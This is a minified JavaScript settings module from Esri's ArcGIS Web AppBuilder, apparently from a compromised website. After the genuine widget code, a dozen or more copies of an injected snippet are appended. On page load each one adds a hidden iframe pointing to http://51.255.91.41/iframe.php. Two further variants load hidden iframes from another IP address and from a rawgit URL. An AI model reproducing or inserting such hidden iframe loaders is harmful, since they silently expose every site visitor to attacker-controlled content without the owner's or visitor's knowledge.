// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/TextDijitSetting.html":'\x3cdiv class\x3d"settings-container"\x3e\r\n  \x3cdiv class\x3d"title"\x3e\r\n    ${nls.titleSettings}\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"style-selector"\x3e\r\n    \x3cdiv class\x3d"section"\x3e\r\n      \x3cdiv class\x3d"setting-items link clearFix"\x3e\r\n        \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.text}"\x3e${nls.text}\x3c/div\x3e\r\n        \x3cdiv class\x3d"setting-wapper jimu-float-trailing"\x3e\r\n          \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" \r\n          required\x3d"true" placeHolder\x3d"" data-dojo-attach-point\x3d"textNode"/\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"section"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"fontSettingNode"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"section"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"backgroundSettingNode"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/on dojo/_base/lang ./BaseDijitSetting dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin ./_dijits/BackgroundSetting ./_dijits/FontSetting dojo/text!./TextDijitSetting.html jimu/dijit/Message".split(" "),function(c,b,a,d,e,f,g,h,k,l,m){return c([d,e,f,g],{templateString:l,type:"text",nls:null,postMixInProperties:function(){a.mixin(this.nls,window.jimuNls.common)},postCreate:function(){this._initText();this.backgroundSetting=new h({config:this.config.background,
nls:this.nls});this.backgroundSetting.placeAt(this.backgroundSettingNode);this.backgroundSetting.startup();this.own(b(this.backgroundSetting,"change",a.hitch(this,function(){this._update()})));this.fontSetting=new k({config:this.config.font,nls:this.nls});this.fontSetting.placeAt(this.fontSettingNode);this.fontSetting.startup();this.own(b(this.fontSetting,"change",a.hitch(this,function(){this._update()})));this._update()},_initText:function(){this.config.text&&this.textNode.setValue(this.config.text);
this.own(b(this.textNode,"change",a.hitch(this,function(){this.config.text!==this.textNode.getValue()&&!1!==this._validText()&&this._update()})));this.own(b(this.textNode,"blur",a.hitch(this,function(){this.config.text!==this.textNode.getValue()&&!1!==this._validText()&&this._update()})))},_validText:function(){return!1===this.textNode.isValid()?(this.message||(this.message=new m({message:this.nls.requiredFieldWarning+this.nls.text,buttons:[{label:this.nls.ok,onClick:a.hitch(this,function(){this.message.content=
null;this.message.close();this.message=null})}]})),!1):!0},_update:function(){this.textNode&&this._validText()&&(this.config.text=this.textNode.getValue());this.backgroundSetting&&this.backgroundSetting.isValid()&&(this.config.background=this.backgroundSetting.getConfig());this.fontSetting&&this.fontSetting.isValid()&&(this.config.font=this.fontSetting.getConfig());this.updateDijit()},getConfig:function(){return this._validText()&&this.backgroundSetting.isValid()&&this.fontSetting.isValid()?this.config:
!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});